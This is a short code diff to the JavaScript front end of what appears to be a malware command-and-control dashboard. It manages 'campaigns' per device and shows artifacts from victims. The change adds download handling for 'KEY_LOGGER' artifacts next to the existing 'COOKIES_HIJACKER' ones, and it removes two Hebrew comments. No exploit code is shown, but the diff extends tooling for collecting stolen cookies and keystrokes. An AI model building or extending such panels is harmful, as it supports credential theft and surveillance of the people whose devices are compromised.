@@ -173,7 +173,7 @@ $(document).ready(function () {
                             artifactElement.append(showContentButton);
                             artifactElement.append(hideButton);
                             artifactElement.append(img);
-                        } else if (artifact.artifact_type === 'COOKIES_HIJACKER') {
+                        } else if (artifact.artifact_type === 'COOKIES_HIJACKER' || artifact.artifact_type === 'KEY_LOGGER') {
                             var downloadButton = $('<button class="btn btn-success btn-sm">Download File</button>');
 
                             downloadButton.on('click', function() {
@@ -222,8 +222,8 @@ function confirmDelete(deviceName) {
             url: '/delete_campaign/' + encodeURIComponent(deviceName),
             method: 'POST',
             success: function (response) {
-                alert(response.message); // הצגת הודעת הצלחה
-                location.reload(); // רענון הדף לאחר ההצלחה
+                alert(response.message); 
+                location.reload();
             },
             error: function (jqXHR, textStatus, errorThrown) {
                 alert('Failed to delete campaign: ' + textStatus + ' - ' + errorThrown);
